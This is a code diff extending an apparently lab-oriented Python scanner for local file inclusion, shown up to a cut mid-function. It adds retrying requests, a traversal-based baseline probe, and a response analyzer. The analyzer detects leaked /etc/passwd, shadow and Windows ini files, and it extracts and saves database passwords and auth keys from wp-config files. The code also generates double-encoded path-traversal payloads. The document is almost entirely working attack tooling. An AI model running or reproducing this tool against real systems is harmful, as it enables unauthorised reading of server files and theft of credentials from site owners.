@@ -12,13 +12,17 @@ import itertools as it
 import random
 import string
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import List, Generator, Optional, Dict, Tuple
-from dataclasses import dataclass
+from typing import List, Generator, Optional, Dict, Tuple, Set
+from dataclasses import dataclass, field
 import warnings
 from urllib.parse import urlparse, parse_qs, urljoin
 import re
 import os
 import json
+import math
+import html
+from pathlib import Path
+
 
 class Banner:
     @staticmethod
@@ -38,6 +42,7 @@ class Banner:
         """
         )
 
+
 class HTTPClient:
     def __init__(
         self,
@@ -47,12 +52,14 @@ class HTTPClient:
         cookies: Optional[Dict] = None,
         headers: Optional[Dict] = None,
         timeout: int = 10,
-        user_agent: str = "wraphper/2.0"
+        user_agent: str = "wraphper/2.0",
+        max_retries: int = 2
     ):
         self.session = requests.Session()
         self.session.verify = verify_ssl
         self.follow_redirects = follow_redirects
         self.timeout = timeout
+        self.max_retries = max_retries
         
         if proxy:
             self.session.proxies = {"http": proxy, "https": proxy}
@@ -65,25 +72,373 @@ class HTTPClient:
         if cookies:
             self.session.cookies.update(cookies)
     
-    def get(self, url: str, timeout: Optional[int] = None) -> Optional[requests.Response]:
-        try:
-            return self.session.get(url, timeout=timeout or self.timeout, allow_redirects=self.follow_redirects)
-        except requests.RequestException:
-            return None
+    def _request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
+        kwargs.setdefault('timeout', self.timeout)
+        kwargs.setdefault('allow_redirects', self.follow_redirects)
+        for attempt in range(self.max_retries + 1):
+            try:
+                return self.session.request(method, url, **kwargs)
+            except requests.RequestException as e:
+                if attempt == self.max_retries:
+                    return None
+                time.sleep(0.5 * (2 ** attempt))  # exponential backoff
+        return None
+    
+    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
+        return self._request('GET', url, **kwargs)
     
     def post(self, url: str, data: Optional[Dict] = None, body: Optional[str] = None,
-             headers: Optional[Dict] = None, timeout: Optional[int] = None) -> Optional[requests.Response]:
+             headers: Optional[Dict] = None, **kwargs) -> Optional[requests.Response]:
+        req_kwargs = {}
+        if body is not None:
+            req_kwargs['data'] = body
+            if headers:
+                req_kwargs['headers'] = headers
+        else:
+            req_kwargs['data'] = data
+        return self._request('POST', url, **req_kwargs, **kwargs)
+
+
+class ResponseNormalizer:
+    """Normalize response content for better analysis."""
+    
+    @staticmethod
+    def normalize(content: str, content_type: str = '') -> str:
+        if not content:
+            return ''
+        # Try to decode JSON if applicable
+        if 'json' in content_type.lower():
+            try:
+                data = json.loads(content)
+                return json.dumps(data, indent=2)
+            except:
+                pass
+        # Unescape HTML entities
         try:
-            kwargs = {'timeout': timeout or self.timeout, 'allow_redirects': self.follow_redirects}
-            if body is not None:
-                kwargs['data'] = body
-                if headers:
-                    kwargs['headers'] = headers
-            else:
-                kwargs['data'] = data
-            return self.session.post(url, **kwargs)
-        except requests.RequestException:
+            content = html.unescape(content)
+        except:
+            pass
+        # Remove excessive whitespace (but keep newlines for structure)
+        # content = re.sub(r'\s+', ' ', content)  # not always good
+        return content
+
+
+class ResponseAnalyzer:
+    INDICATORS = {
+        "root:x:0:0": {"type": "LFI", "confidence": 0.95},
+        "root:*:0:0": {"type": "LFI", "confidence": 0.95},
+        "daemon:x:1:1": {"type": "LFI", "confidence": 0.9},
+        "bin:x:2:2": {"type": "LFI", "confidence": 0.9},
+        "nobody:x:65534": {"type": "LFI", "confidence": 0.85},
+        "carlos:x:": {"type": "LFI", "confidence": 0.95},
+        "carlos:$": {"type": "LFI", "confidence": 0.9},
+        "carlos:!": {"type": "LFI", "confidence": 0.9},
+        "[fonts]": {"type": "LFI", "confidence": 0.9},
+        "[extensions]": {"type": "LFI", "confidence": 0.9},
+        "[mci extensions]": {"type": "LFI", "confidence": 0.9},
+        "[files]": {"type": "LFI", "confidence": 0.85},
+        "127.0.0.1": {"type": "LFI", "confidence": 0.7},
+        "localhost": {"type": "LFI", "confidence": 0.7},
+        "uid=": {"type": "RCE", "confidence": 0.95},
+        "gid=": {"type": "RCE", "confidence": 0.95},
+        "VULN": {"type": "RCE", "confidence": 0.8},
+        "phpinfo()": {"type": "RCE", "confidence": 0.9},
+        "PHP Version": {"type": "RCE", "confidence": 0.9},
+        "Congratulations": {"type": "SUCCESS", "confidence": 1.0},
+        "solved": {"type": "SUCCESS", "confidence": 1.0},
+        "Volume Serial Number": {"type": "LFI", "confidence": 0.85},
+        "[boot loader]": {"type": "LFI", "confidence": 0.85},
+        "root::0:0": {"type": "LFI", "confidence": 0.8},
+        "mysql:x:": {"type": "LFI", "confidence": 0.8},
+        "www-data:x:": {"type": "LFI", "confidence": 0.8},
+        "DOCUMENT_ROOT=": {"type": "ENV", "confidence": 0.7},
+        "SERVER_ADMIN": {"type": "ENV", "confidence": 0.7},
+        "ServerRoot": {"type": "LFI", "confidence": 0.75},
+        "DocumentRoot": {"type": "LFI", "confidence": 0.75},
+        "DB_PASSWORD": {"type": "LFI", "confidence": 0.9},
+        "DB_USER": {"type": "LFI", "confidence": 0.9},
+        "WP_DEBUG": {"type": "LFI", "confidence": 0.8},
+        "AUTH_KEY": {"type": "LFI", "confidence": 0.85},
+        "SECURE_AUTH_KEY": {"type": "LFI", "confidence": 0.85},
+        "listen": {"type": "LFI", "confidence": 0.6},
+        "ServerName": {"type": "LFI", "confidence": 0.6},
+        "ServerAdmin": {"type": "LFI", "confidence": 0.6},
+        "/bin/bash": {"type": "LFI", "confidence": 0.8},
+        "/bin/sh": {"type": "LFI", "confidence": 0.8},
+        "/usr/bin": {"type": "LFI", "confidence": 0.6},
+    }
+    
+    ERROR_PATTERNS = [
+        r"Warning:\s+include\(([^)]+)\)",
+        r"Warning:\s+require\(([^)]+)\)",
+        r"Warning:\s+include_once\(([^)]+)\)",
+        r"Warning:\s+require_once\(([^)]+)\)",
+        r"failed to open stream:\s+(.+?)\s+in",
+        r"No such file or directory in (.+?) on line",
+        r"open_basedir restriction in effect",
+        r"Call to undefined function",
+        r"Undefined variable",
+        r"Cannot modify header information",
+        r"PHP Warning:",
+        r"PHP Notice:",
+        r"PHP Fatal error:",
+        r"Warning: file_get_contents",
+        r"failed to open stream: No such file or directory",
+    ]
+    
+    @staticmethod
+    def extract_path_from_error(content: str) -> Optional[str]:
+        for pattern in ResponseAnalyzer.ERROR_PATTERNS:
+            match = re.search(pattern, content, re.IGNORECASE)
+            if match:
+                path = match.group(1) if match.lastindex else match.group(0)
+                return path.strip()
+        return None
+    
+    @staticmethod
+    def extract_content_snippet(content: str, max_lines: int = 3, max_chars: int = 150) -> Optional[str]:
+        if not content:
             return None
+        lines = content.split('\n')
+        relevant_lines = []
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+            clean_line = re.sub(r'<[^>]+>', '', line).strip()
+            if not clean_line:
+                continue
+            if any(pattern in clean_line for pattern in [
+                'root:', 'daemon:', 'bin:', 'nobody:', 'www-data:', 'x:0:0', 'x:1:1', 'x:2:2',
+                '127.0.0.1', 'localhost', 'Volume Serial', 'DB_PASSWORD', 'DB_USER', 'DB_NAME',
+                'DB_HOST', 'AUTH_KEY', 'SECURE_AUTH', 'WP_HOME', 'uid=', 'gid=', 'PHP Version',
+                '[', 'ServerRoot', 'DocumentRoot', 'DOCUMENT_ROOT', 'SERVER_ADMIN', 'carlos:',
+                '/bin/bash', '/bin/sh', 'listen', 'ServerName'
+            ]):
+                relevant_lines.append(clean_line)
+            if len(relevant_lines) >= max_lines:
+                break
+        if relevant_lines:
+            snippet = ' | '.join(relevant_lines)
+            if len(snippet) > max_chars:
+                snippet = snippet[:max_chars-3] + '...'
+            return snippet
+        for line in lines:
+            clean_line = re.sub(r'<[^>]+>', '', line).strip()
+            if clean_line and len(clean_line) > 10:
+                return clean_line[:max_chars]
+        return None
+    
+    @staticmethod
+    def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
+        try:
+            cleaned = ''.join(content.split())
+            if len(cleaned) % 4 == 0 and len(cleaned) > 20:
+                try:
+                    decoded = base64.b64decode(cleaned).decode('utf-8', errors='ignore')
+                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
+                        if pattern in decoded:
+                            return f"{info['type']}(base64)", decoded
+                except:
+                    pass
+            b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
+            for match in b64_pattern:
+                try:
+                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
+                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
+                        if pattern in decoded:
+                            return f"{info['type']}(base64)", decoded
+                except:
+                    continue
+        except:
+            pass
+        return None, None
+    
+    @staticmethod
+    def analyze_php_errors(content: str) -> Dict:
+        errors = {}
+        path = ResponseAnalyzer.extract_path_from_error(content)
+        if path:
+            errors['exposed_path'] = path
+            errors['error_type'] = 'path_disclosure'
+        abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
+        if abs_paths:
+            errors['absolute_paths'] = abs_paths
+        doc_match = re.search(r'in\s+(/[\w/.-]+)', content)
+        if doc_match:
+            errors['possible_doc_root'] = doc_match.group(1)
+        return errors
+    
+    @staticmethod
+    def detect_unix_passwd_format(content: str) -> Tuple[bool, List[str]]:
+        lines = content.split('\n')
+        found = []
+        patterns = [
+            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:',     # passwd with x or * or !
+            r'^[a-z_][a-z0-9_-]*:\$[0-9]\$[a-zA-Z0-9./]+\$:',  # shadow hash
+            r'^[a-z_][a-z0-9_-]*:!?:\d+:\d+:',        # shadow
+            r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:',          # explicit x
+            r'^[a-z_][a-z0-9_-]*:\*:\d+:\d+:',         # BSD
+            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:',          # group
+        ]
+        for line in lines:
+            line = line.strip()
+            for pat in patterns:
+                if re.match(pat, line):
+                    found.append(line)
+                    break
+            if len(found) >= 5:
+                break
+        return len(found) > 0, found
+    
+    @staticmethod
+    def detect_php_defines(content: str) -> Tuple[bool, Dict]:
+        defines = {}
+        patterns = {
+            r"define\s*\(\s*['\"](DB_PASSWORD|DB_USER|DB_NAME|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)": "wp_config",
+            r"\$db_password\s*=\s*['\"]([^'\"]+)['\"]": "db_password",
+            r"\$database_password\s*=\s*['\"]([^'\"]+)['\"]": "db_password",
+        }
+        for pattern, source in patterns.items():
+            matches = re.findall(pattern, content, re.IGNORECASE)
+            for match in matches:
+                if isinstance(match, tuple):
+                    key, val = match[0], match[1]
+                else:
+                    key, val = "password", match
+                defines[key] = val
+        return len(defines) > 0, defines
+    
+    @staticmethod
+    def combine_confidence(indicators: List[Dict]) -> float:
+        """
+        Combine multiple indicator confidences using log-odds (Bayesian) fusion.
+        Assumes independence; gives more weight to multiple corroborating signals.
+        """
+        if not indicators:
+            return 0.0
+        # Use log-odds: log(p/(1-p))
+        log_odds = 0.0
+        for ind in indicators:
+            conf = ind.get('confidence', 0.5)
+            # Clamp to avoid numerical issues
+            conf = max(0.01, min(0.99, conf))
+            # Convert to log-odds
+            lo = math.log(conf / (1 - conf))
+            log_odds += lo
+        # Convert back to probability
+        combined = 1 / (1 + math.exp(-log_odds))
+        return min(0.999, combined)
+    
+    @staticmethod
+    def analyze(content: str, response_headers: Dict = None, baseline: Dict = None) -> Dict:
+        """
+        Enhanced analysis with baseline comparison and normalized content.
+        """
+        result = {
+            'vulnerability_type': None,
+            'confidence': 0.0,
+            'details': {},
+            'indicators_found': [],
+            'content_snippet': None,
+            'is_baseline_deviation': False,
+        }
+        if not content:
+            return result
+        
+        # Normalize content
+        content_type = response_headers.get('Content-Type', '') if response_headers else ''
+        normalized = ResponseNormalizer.normalize(content, content_type)
+        
+        # Collect indicators
+        indicators = []
+        for pattern, info in ResponseAnalyzer.INDICATORS.items():
+            if pattern in normalized:
+                indicators.append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})
+                result['indicators_found'].append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})
+        
+        # Unix passwd format
+        is_passwd, passwd_lines = ResponseAnalyzer.detect_unix_passwd_format(normalized)
+        if is_passwd:
+            indicators.append({'pattern': 'unix_passwd_format', 'type': 'LFI', 'confidence': 0.95})
+            result['indicators_found'].append({'pattern': 'unix_passwd_format', 'type': 'LFI', 'confidence': 0.95})
+            result['details']['passwd_lines'] = passwd_lines[:3]
+            if not result['content_snippet']:
+                result['content_snippet'] = ' | '.join(passwd_lines[:2])
+        
+        # PHP defines
+        has_defines, defines = ResponseAnalyzer.detect_php_defines(normalized)
+        if has_defines:
+            indicators.append({'pattern': 'php_config_defines', 'type': 'LFI', 'confidence': 0.9})
+            result['indicators_found'].append({'pattern': 'php_config_defines', 'type': 'LFI', 'confidence': 0.9})
+            result['details']['php_defines'] = defines
+            if not result['content_snippet']:
+                result['content_snippet'] = ', '.join([f"{k}={v}" for k, v in list(defines.items())[:2]])
+        
+        # Base64
+        vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(normalized)
+        if vuln_type:
+            indicators.append({'pattern': 'base64_decoded', 'type': vuln_type, 'confidence': 0.8})
+            result['indicators_found'].append({'pattern': 'base64_decoded', 'type': vuln_type, 'confidence': 0.8})
+            result['details']['base64_decoded'] = decoded[:500]
+            if not result['content_snippet']:
+                result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(decoded)
+        
+        # PHP errors (path disclosure)
+        php_errors = ResponseAnalyzer.analyze_php_errors(normalized)
+        if php_errors:
+            result['details']['php_errors'] = php_errors
+            if 'exposed_path' in php_errors:
+                indicators.append({'pattern': 'path_disclosure', 'type': 'PATH_DISCLOSURE', 'confidence': 0.85})
+                result['indicators_found'].append({'pattern': 'path_disclosure', 'type': 'PATH_DISCLOSURE', 'confidence': 0.85})
+        
+        # Baseline deviation
+        if baseline:
+            baseline_len = baseline.get('length', 0)
+            current_len = len(normalized)
+            if baseline_len > 0:
+                # Significant length change (>20%) indicates possible inclusion
+                ratio = current_len / baseline_len
+                if ratio > 1.2 or ratio < 0.8:
+                    result['is_baseline_deviation'] = True
+                    indicators.append({'pattern': 'length_deviation', 'type': 'LFI', 'confidence': 0.6})
+                    result['indicators_found'].append({'pattern': 'length_deviation', 'type': 'LFI', 'confidence': 0.6})
+        
+        # Combine confidences
+        if indicators:
+            combined_conf = ResponseAnalyzer.combine_confidence(indicators)
+            result['confidence'] = combined_conf
+            # Determine primary type from highest confidence indicator
+            if indicators:
+                primary = max(indicators, key=lambda x: x['confidence'])
+                result['vulnerability_type'] = primary['type']
+        
+        # Fallback snippet
+        if not result['content_snippet']:
+            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(normalized)
+        
+        # Interesting headers
+        if response_headers:
+            result['details']['interesting_headers'] = {}
+            for header in ['Server', 'X-Powered-By', 'Set-Cookie']:
+                if header in response_headers:
+                    result['details']['interesting_headers'][header] = response_headers[header]
+        
+        return result
+
+
+@dataclass
+class Finding:
+    payload: str
+    vuln_type: str
+    confidence: float
+    details: Dict = None
+    url: str = ""
+    content_snippet: str = ""
+    verified: bool = False
+    def __post_init__(self):
+        if self.details is None:
+            self.details = {}
 
 
 class PayloadGenerator:
@@ -363,243 +718,6 @@ class PayloadGenerator:
                 yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}"
 
 
-class ResponseAnalyzer:
-    INDICATORS = {
-        "root:x:0:0": {"type": "LFI", "confidence": 0.95},
-        "root:*:0:0": {"type": "LFI", "confidence": 0.95},
-        "daemon:x:1:1": {"type": "LFI", "confidence": 0.9},
-        "bin:x:2:2": {"type": "LFI", "confidence": 0.9},
-        "nobody:x:65534": {"type": "LFI", "confidence": 0.85},
-        "carlos:x:": {"type": "LFI", "confidence": 0.95},
-        "carlos:$": {"type": "LFI", "confidence": 0.9},
-        "carlos:!": {"type": "LFI", "confidence": 0.9},
-        "[fonts]": {"type": "LFI", "confidence": 0.9},
-        "[extensions]": {"type": "LFI", "confidence": 0.9},
-        "[mci extensions]": {"type": "LFI", "confidence": 0.9},
-        "[files]": {"type": "LFI", "confidence": 0.85},
-        "127.0.0.1": {"type": "LFI", "confidence": 0.7},
-        "localhost": {"type": "LFI", "confidence": 0.7},
-        "uid=": {"type": "RCE", "confidence": 0.95},
-        "gid=": {"type": "RCE", "confidence": 0.95},
-        "VULN": {"type": "RCE", "confidence": 0.8},
-        "phpinfo()": {"type": "RCE", "confidence": 0.9},
-        "PHP Version": {"type": "RCE", "confidence": 0.9},
-        "Congratulations": {"type": "SUCCESS", "confidence": 1.0},
-        "solved": {"type": "SUCCESS", "confidence": 1.0},
-        "Volume Serial Number": {"type": "LFI", "confidence": 0.85},
-        "[boot loader]": {"type": "LFI", "confidence": 0.85},
-        "root::0:0": {"type": "LFI", "confidence": 0.8},
-        "mysql:x:": {"type": "LFI", "confidence": 0.8},
-        "www-data:x:": {"type": "LFI", "confidence": 0.8},
-        "DOCUMENT_ROOT=": {"type": "ENV", "confidence": 0.7},
-        "SERVER_ADMIN": {"type": "ENV", "confidence": 0.7},
-        "ServerRoot": {"type": "LFI", "confidence": 0.75},
-        "DocumentRoot": {"type": "LFI", "confidence": 0.75},
-        "DB_PASSWORD": {"type": "LFI", "confidence": 0.9},
-        "DB_USER": {"type": "LFI", "confidence": 0.9},
-        "WP_DEBUG": {"type": "LFI", "confidence": 0.8},
-        "AUTH_KEY": {"type": "LFI", "confidence": 0.85},
-        "SECURE_AUTH_KEY": {"type": "LFI", "confidence": 0.85},
-        "listen": {"type": "LFI", "confidence": 0.6},
-        "ServerName": {"type": "LFI", "confidence": 0.6},
-        "ServerAdmin": {"type": "LFI", "confidence": 0.6},
-    }
-    
-    ERROR_PATTERNS = [ r"Warning:\s+include\(([^)]+)\)", r"Warning:\s+require\(([^)]+)\)", r"Warning:\s+include_once\(([^)]+)\)", r"Warning:\s+require_once\(([^)]+)\)", r"failed to open stream:\s+(.+?)\s+in", r"No such file or directory in (.+?) on line", r"open_basedir restriction in effect", r"Call to undefined function", r"Undefined variable", r"Cannot modify header information", r"PHP Warning:", r"PHP Notice:", r"PHP Fatal error:", r"Warning: file_get_contents", r"failed to open stream: No such file or directory", ]
-    
-    @staticmethod
-    def extract_path_from_error(content: str) -> Optional[str]:
-        for pattern in ResponseAnalyzer.ERROR_PATTERNS:
-            match = re.search(pattern, content, re.IGNORECASE)
-            if match:
-                path = match.group(1) if match.lastindex else match.group(0)
-                return path.strip()
-        return None
-    
-    @staticmethod
-    def extract_content_snippet(content: str, max_lines: int = 3, max_chars: int = 150) -> Optional[str]:
-        if not content:
-            return None
-        lines = content.split('\n')
-        relevant_lines = []
-        for line in lines:
-            line = line.strip()
-            if not line:
-                continue
-            clean_line = re.sub(r'<[^>]+>', '', line).strip()
-            if not clean_line:
-                continue
-            if any(pattern in clean_line for pattern in [ 'root:', 'daemon:', 'bin:', 'nobody:', 'www-data:', 'x:0:0', 'x:1:1', 'x:2:2', '127.0.0.1', 'localhost', 'Volume Serial', 'DB_PASSWORD', 'DB_USER', 'DB_NAME', 'DB_HOST', 'AUTH_KEY', 'SECURE_AUTH', 'WP_HOME', 'uid=', 'gid=', 'PHP Version', '[', 'ServerRoot', 'DocumentRoot', 'DOCUMENT_ROOT', 'SERVER_ADMIN', 'carlos:', '/bin/bash', '/bin/sh', 'listen', 'ServerName' ]):
-                relevant_lines.append(clean_line)
-            if len(relevant_lines) >= max_lines:
-                break
-        if relevant_lines:
-            snippet = ' | '.join(relevant_lines)
-            if len(snippet) > max_chars:
-                snippet = snippet[:max_chars-3] + '...'
-            return snippet
-        for line in lines:
-            clean_line = re.sub(r'<[^>]+>', '', line).strip()
-            if clean_line and len(clean_line) > 10:
-                return clean_line[:max_chars]
-        return None
-    
-    @staticmethod
-    def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
-        try:
-            cleaned = ''.join(content.split())
-            if len(cleaned) % 4 == 0 and len(cleaned) > 20:
-                try:
-                    decoded = base64.b64decode(cleaned).decode('utf-8', errors='ignore')
-                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
-                        if pattern in decoded:
-                            return f"{info['type']}(base64)", decoded
-                except:
-                    pass
-            b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
-            for match in b64_pattern:
-                try:
-                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
-                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
-                        if pattern in decoded:
-                            return f"{info['type']}(base64)", decoded
-                except:
-                    continue
-        except:
-            pass
-        return None, None
-    
-    @staticmethod
-    def analyze_php_errors(content: str) -> Dict:
-        errors = {}
-        path = ResponseAnalyzer.extract_path_from_error(content)
-        if path:
-            errors['exposed_path'] = path
-            errors['error_type'] = 'path_disclosure'
-        abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
-        if abs_paths:
-            errors['absolute_paths'] = abs_paths
-        doc_match = re.search(r'in\s+(/[\w/.-]+)', content)
-        if doc_match:
-            errors['possible_doc_root'] = doc_match.group(1)
-        return errors
-    
-    @staticmethod
-    def detect_unix_passwd_format(content: str) -> Tuple[bool, List[str]]:
-        lines = content.split('\n')
-        found = []
-        patterns = [
-            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:',     # passwd with x or * or !
-            r'^[a-z_][a-z0-9_-]*:\$[0-9]\$[a-zA-Z0-9./]+\$:',  # shadow hash
-            r'^[a-z_][a-z0-9_-]*:!?:\d+:\d+:',        # shadow
-            r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:',          # explicit x
-            r'^[a-z_][a-z0-9_-]*:\*:\d+:\d+:',         # BSD
-            r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:',          # group
-        ]
-        for line in lines:
-            line = line.strip()
-            for pat in patterns:
-                if re.match(pat, line):
-                    found.append(line)
-                    break
-            if len(found) >= 5:
-                break
-        return len(found) > 0, found
-    
-    @staticmethod
-    def detect_php_defines(content: str) -> Tuple[bool, Dict]:
-        defines = {}
-        patterns = {
-            r"define\s*\(\s*['\"](DB_PASSWORD|DB_USER|DB_NAME|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)": "wp_config",
-            r"\$db_password\s*=\s*['\"]([^'\"]+)['\"]": "db_password",
-            r"\$database_password\s*=\s*['\"]([^'\"]+)['\"]": "db_password",
-        }
-        for pattern, source in patterns.items():
-            matches = re.findall(pattern, content, re.IGNORECASE)
-            for match in matches:
-                if isinstance(match, tuple):
-                    key, val = match[0], match[1]
-                else:
-                    key, val = "password", match
-                defines[key] = val
-        return len(defines) > 0, defines
-    
-    @staticmethod
-    def analyze(content: str, response_headers: Dict = None) -> Dict:
-        result = {
-            'vulnerability_type': None,
-            'confidence': 0.0,
-            'details': {},
-            'indicators_found': [],
-            'content_snippet': None
-        }
-        if not content:
-            return result
-        
-        for pattern, info in ResponseAnalyzer.INDICATORS.items():
-            if pattern in content:
-                result['indicators_found'].append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})
-                if info['confidence'] > result['confidence']:
-                    result['vulnerability_type'] = info['type']
-                    result['confidence'] = info['confidence']
-        
-        is_passwd, passwd_lines = ResponseAnalyzer.detect_unix_passwd_format(content)
-        if is_passwd:
-            result['indicators_found'].append({'pattern': 'unix_passwd_format', 'type': 'LFI', 'confidence': 0.95})
-            result['confidence'] = max(result['confidence'], 0.95)
-            result['vulnerability_type'] = 'LFI'
-            result['details']['passwd_lines'] = passwd_lines[:3]
-            if not result['content_snippet']:
-                result['content_snippet'] = ' | '.join(passwd_lines[:2])
-        
-        has_defines, defines = ResponseAnalyzer.detect_php_defines(content)
-        if has_defines:
-            result['indicators_found'].append({'pattern': 'php_config_defines', 'type': 'LFI', 'confidence': 0.9})
-            result['confidence'] = max(result['confidence'], 0.9)
-            result['details']['php_defines'] = defines
-            if not result['content_snippet']:
-                result['content_snippet'] = ', '.join([f"{k}={v}" for k,v in list(defines.items())[:2]])
-        
-        vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(content)
-        if vuln_type:
-            result['vulnerability_type'] = vuln_type
-            result['confidence'] = max(result['confidence'], 0.8)
-            result['details']['base64_decoded'] = decoded[:500]
-            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(decoded)
-        
-        if not result['content_snippet']:
-            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(content)
-        
-        php_errors = ResponseAnalyzer.analyze_php_errors(content)
-        if php_errors:
-            result['details']['php_errors'] = php_errors
-            if 'exposed_path' in php_errors:
-                result['confidence'] = max(result['confidence'], 0.85)
-                if not result['vulnerability_type']:
-                    result['vulnerability_type'] = 'PATH_DISCLOSURE'
-        
-        if response_headers:
-            result['details']['interesting_headers'] = {}
-            for header in ['Server', 'X-Powered-By', 'Set-Cookie']:
-                if header in response_headers:
-                    result['details']['interesting_headers'][header] = response_headers[header]
-        
-        return result
-
-
-@dataclass
-class Finding:
-    payload: str
-    vuln_type: str
-    confidence: float
-    details: Dict = None
-    url: str = ""
-    content_snippet: str = ""
-    def __post_init__(self):
-        if self.details is None:
-            self.details = {}
-
-
 class ProgressAnimator(threading.Thread):
     def __init__(self, scanner):
         super().__init__(daemon=True)
@@ -614,7 +732,10 @@ class ProgressAnimator(threading.Thread):
 
 
 class LFIScanner:
-    def __init__(self, client: HTTPClient, delay: float = 0.1, threads: int = 10, method: str = "GET", post_data: Dict = None, target_files: Optional[List[str]] = None, target_dir: Optional[str] = None, intensity: str = "normal", output_file: Optional[str] = None, verbose: bool = False, smart_mode: bool = False):
+    def __init__(self, client: HTTPClient, delay: float = 0.1, threads: int = 10, method: str = "GET", 
+                 post_data: Dict = None, target_files: Optional[List[str]] = None, target_dir: Optional[str] = None,
+                 intensity: str = "normal", output_file: Optional[str] = None, verbose: bool = False,
+                 smart_mode: bool = False, no_validation: bool = False):
         self.client = client
         self.delay = delay
         self.threads = threads
@@ -631,8 +752,10 @@ class LFIScanner:
         self.output_file = output_file
         self.verbose = verbose
         self.smart_mode = smart_mode
+        self.no_validation = no_validation
         self.discovered_paths = set()
         self.doc_root = None
+        self.baseline = None
         signal.signal(signal.SIGINT, self._handle_stop)
     
     def _handle_stop(self, *_):
@@ -647,16 +770,54 @@ class LFIScanner:
         if not self.output_file:
             return
         try:
-            results = {'scan_info': {'total_tested': self.tested, 'duration': time.time() - self.start_time, 'findings_count': len(self.findings)}, 'findings': []}
+            results = {'scan_info': {'total_tested': self.tested, 'duration': time.time() - self.start_time,
+                                     'findings_count': len(self.findings)}, 'findings': []}
             for finding in self.findings:
-                results['findings'].append({'type': finding.vuln_type, 'confidence': finding.confidence, 'payload': finding.payload, 'url': finding.url, 'details': finding.details, 'content_snippet': finding.content_snippet})
+                results['findings'].append({
+                    'type': finding.vuln_type,
+                    'confidence': finding.confidence,
+                    'payload': finding.payload,
+                    'url': finding.url,
+                    'details': finding.details,
+                    'content_snippet': finding.content_snippet,
+                    'verified': finding.verified
+                })
             with open(self.output_file, 'w') as f:
                 json.dump(results, f, indent=2)
             print(f"\n\033[96m[*] Results saved to: {self.output_file}\033[0m")
         except Exception as e:
             print(f"\n\033[91m[!] Failed to save results: {str(e)}\033[0m")
     
-    def scan_payload(self, url: str, param: str, payload: str):
+    def establish_baseline(self, url: str, param: str):
+        """Send a request for a nonexistent file to establish baseline response."""
+        dummy_payload = "../../../../../../../../nonexistent_file_xyz_123"
+        safe = urllib.parse.quote(dummy_payload)
+        if self.method == "GET":
+            parsed = urlparse(url)
+            query_params = parse_qs(parsed.query)
+            query_params[param] = [safe]
+            new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
+            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+            resp = self.client.get(full_url)
+        else:
+            body_data = self.post_data.copy()
+            body_data[param] = safe
+            body = "&".join([f"{k}={v}" for k, v in body_data.items()])
+            resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+        
+        if resp:
+            self.baseline = {
+                'status_code': resp.status_code,
+                'length': len(resp.text),
+                'headers': dict(resp.headers),
+                'content': resp.text[:500]  # store snippet for debugging
+            }
+            if self.verbose:
+                print(f"\033[90m[*] Baseline established: status={resp.status_code}, length={len(resp.text)}\033[0m")
+        else:
+            self.baseline = {'status_code': 0, 'length': 0, 'headers': {}, 'content': ''}
+    
+    def scan_payload(self, url: str, param: str, payload: str, candidate_list: List[Finding]):
         if self.stop:
             return
         try:
@@ -672,14 +833,18 @@ class LFIScanner:
                 body_data = self.post_data.copy()
                 body_data[param] = safe_payload
                 body = "&".join([f"{k}={v}" for k, v in body_data.items()])
-                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                 full_url = url
-                response = self.client.post(url, body=body, headers=headers)
+                response = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+            
             with self.lock:
                 self.tested += 1
+            
             if not response:
                 return
-            analysis = ResponseAnalyzer.analyze(response.text, dict(response.headers))
+            
+            analysis = ResponseAnalyzer.analyze(response.text, dict(response.headers), self.baseline)
+            
+            # Smart mode: update discovered paths
             if self.smart_mode and analysis['details'].get('php_errors'):
                 path = analysis['details']['php_errors'].get('exposed_path')
                 if path and path not in self.discovered_paths:
@@ -687,20 +852,106 @@ class LFIScanner:
                     if not self.doc_root and 'possible_doc_root' in analysis['details']['php_errors']:
                         self.doc_root = analysis['details']['php_errors']['possible_doc_root']
                         print(f"\n\033[94m[*] Possible document root: {self.doc_root}\033[0m")
+            
+            # Verbose output for potential hits
